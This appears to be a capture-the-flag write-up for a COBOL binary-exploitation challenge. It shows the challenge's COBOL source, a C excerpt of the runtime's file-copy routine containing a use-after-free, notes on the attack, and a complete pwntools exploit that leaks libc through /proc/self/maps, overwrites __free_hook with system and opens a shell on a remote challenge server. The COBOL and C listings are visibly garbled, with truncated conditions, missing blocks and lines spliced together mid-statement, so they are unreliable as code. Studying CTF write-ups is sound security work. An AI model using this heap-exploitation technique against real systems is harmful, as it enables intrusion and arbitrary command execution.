    01 itr.
    05 J PIC 9(2).
    01 looping.
    05 opt PIC 9(1).
    88 ENDLOOP VALUE HIGH-VALUES.
    05 rep PIC A(1).
    01 OPT-6.
    05 fname61 PIC X(256).
    05 fname62 PIC X(256).
    01 FILES.
    05 fnm PIC X(256).
    05 fidx PIC 9(1).
    05 foff PIC 9(10) VALUE ZERO BINARY.
    05 fnmp PIC X(256) OCCURS 16 TIMES.
    05 ffd PIC 9(4) USAGE BINARY OCCURS 16 TIMES.
    05 tfd PIC 9(4) USAGE BINARY.
    05 fsz PIC 9(4) USAGE BINARY OCCURS 16 TIMES.
    05 tsz PIC 9(4) USAGE BINARY.
    05 fptr USAGE POINTER OCCURS 16 TIMES.
    05 floop PIC 9(1).
    PROCEDURE DIVISION.
    PERFORM VARYING J FROM 1 BY 1 UNTIL J > 16
       MOVE ZERO TO ffd(J)
       MOVE ZERO TO fsz(J)
    END-PERFORM.
    PERFORM UNTIL ENDLOOP
       DISPLAY "-----------------------"
       DISPLAY "1 - Create file"
       DISPLAY "2 - Open file"
       DISPLAY "3 - Read file"
       DISPLAY "4 - Write file"
       DISPLAY "5 - Close file"
       DISPLAY "6 - Copy file"
       DISPLAY "7 - Exit"
       DISPLAY "> "
       ACCEPT opt
       IF opt IS EQUAL TO 1 THEN
           DISPLAY "File Name: "
           ACCEPT fnm
           DISPLAY "Index: "
           ACCEPT fidx
           IF (fidx IS >= 1) AND (fidx IS = 4096) THEN
                       SET fsz(fidx) TO 1
                   END-IF
                   CALL "malloc" USING BY VALUE fsz(fidx)
    -                        RETURNING fptr(fidx)
                   IF fptr(fidx) NOT EQUAL TO NULL THEN
                       CALL "CBL_CREATE_FILE"
    -                            USING fnm 3 3 0 ffd(fidx)
                       IF RETURN-CODE NOT EQUAL TO 0 THEN
                           DISPLAY "failed to create file"
                           CALL "free" USING BY VALUE fptr(fidx)
                           SET ffd(fidx) TO 0
                           SET fsz(fidx) TO 0
                           SET fptr(fidx) TO NULL
                       END-IF
                   ELSE
                       DISPLAY "Unable to allocate memory!"
                       SET ENDLOOP TO TRUE
                   END-IF
               ELSE
                   DISPLAY "Not empty"
               END-IF
           ELSE
               DISPLAY "Bad Input"
           END-IF
       END-IF
       IF opt IS EQUAL TO 2 THEN
           DISPLAY "File Name: "
           ACCEPT fnm
           DISPLAY "Index: "
           ACCEPT fidx
           IF (fidx IS >= 1) AND (fidx IS = 4096) THEN
                       SET fsz(fidx) TO 1
                   END-IF
                   CALL "malloc"
    -                    USING BY VALUE fsz(fidx) RETURNING fptr(fidx)
                   IF fptr(fidx) NOT EQUAL TO NULL THEN
                       CALL "CBL_OPEN_FILE"
    -                            USING fnm 3 3 0 ffd(fidx)
                       IF RETURN-CODE NOT EQUAL TO 0 THEN
                           DISPLAY "failed to open file"
                           CALL "free" USING BY VALUE fptr(fidx)
                           SET ffd(fidx) TO 0
                           SET fsz(fidx) TO 0
                           SET fptr(fidx) TO NULL
                       END-IF
                   ELSE
                       DISPLAY "Unable to allocate memory!"
                       SET ENDLOOP TO TRUE
                   END-IF
               ELSE
                   DISPLAY "Not empty"
               END-IF
           ELSE
               DISPLAY "Bad Input"
           END-IF
       END-IF
       IF opt IS EQUAL TO 3 THEN
           DISPLAY "Index: "
           ACCEPT fidx
           IF (fidx IS >= 1) AND (fidx IS = 1) AND (fidx IS = 1) AND (fidx IS cob_procedure_parameters[0]) {
            return -1;
        }
        if (!cob_current_module->cob_procedure_parameters[1]) {
            return -1;
        }
        fn1 = cob_str_from_fld (cob_current_module->cob_procedure_parameters[0]);
        flag |= O_RDONLY;
        fd1 = open (fn1, flag, 0);
        if (fd1 cob_procedure_parameters[1]);
        flag &= ~O_RDONLY;
        flag |= O_CREAT | O_TRUNC | O_WRONLY;
        fd2 = open (fn2, flag, 0660);
        if (fd2  0) {
            if (write (fd2, fn1, (size_t)i) cob_procedure_parameters[0]);`，`free (fn1);`，然后又`read
(fd1, fn1, sizeof(fn1)))`，简单直白的UAF。
###  利用思路
  1. 由于无法直接调用所给功能去`open("/proc/self/maps)`，这里通过strace跟踪发现，`CBL_OPEN_FILE`最后是`openat(AT_FDCWD, "/proc/self/maps", O_RDWR) = -1 EACCES (Permission denied)`，是打不开的；但是如果通过`CBL_COPY_FILE`的话，底层是`openat(AT_FDCWD, "/proc/self/maps", O_RDONLY) = 3`，是可以直接将`/proc/self/maps`复制到`/dev/stdout`，就能将内容打印到标准输出上，实现leak。
  2. 然后利用`CBL_COPY_FILE`里存在的UAF，分配到`__free_hook`，改为`system`即可。
###  exp
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    import sys, os, re
    context(arch='amd64', os='linux', log_level='debug')
    _proc = os.path.abspath('./chall')
    _libc = os.path.abspath('./libc-2.27.so')
    libc = ELF(_libc)
    elf = ELF(_proc)
    p = remote('cobol.pwni.ng', 3083)
    # menu
    choose_items = {
        "create": 1,
        "open": 2,
        "read": 3,
        "write": 4,
        "close": 5,
        "copy": 6
    }
    def choose(idx):
        p.sendlineafter("> ", str(idx))
    def create_file(filename, idx, size):
        choose(choose_items['create'])
        p.sendlineafter("File Name:", filename)
        p.sendlineafter("Index:", str(idx))
        p.sendlineafter("Buf Size:", str(size))
    def open_file(filename, idx, size):
        choose(choose_items['open'])
        p.sendlineafter("File Name:", filename)
        p.sendlineafter("Index:", str(idx))
        p.sendlineafter("Buf Size:", str(size))
    def read_file(idx):
        choose(choose_items['read'])
        p.sendlineafter("Index:", str(idx))
    def write_file(idx, content):
        choose(choose_items['write'])
        p.sendlineafter("Index:", str(idx))
        p.sendafter("Input:", content)
        p.sendlineafter("Read More (Y/y for yes)", "n")
    def close_file(idx):
        choose(choose_items['close'])
        p.sendlineafter("Index:", str(idx))
    def copy_file(src, dst):
        choose(choose_items['copy'])
        p.sendlineafter("Enter filename1: ", src)
        p.sendlineafter("Enter filename2: ", dst)
    # leak
    copy_file("/proc/self/maps", "/dev/stdout")
    for i in range(4):
        p.recvuntil("/lib/x86_64-linux-gnu/libm-2.27.so\n")
    libc_base = int(p.recv(12), 16)
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    # create two files
    create_file("tmpfile1.txt".rjust(0x30, 'A'), 1, 0x38)
    create_file("tmpfile2.txt", 2, 0x8)
    write_file(1, p64(__free_hook))
    # uaf
    copy_file("tmpfile1.txt".rjust(0x30, 'A'), "tmpfile2.txt")
    create_file("tmpfile3.txt", 3, 0x38)
    create_file("tmpfile4.txt", 4, 0x38)
    write_file(3, "/bin/sh\x00")
    write_file(4, p64(system))
    # trigger
    close_file(3)
    success("libc_base: " + hex(libc_base))
    p.interactive()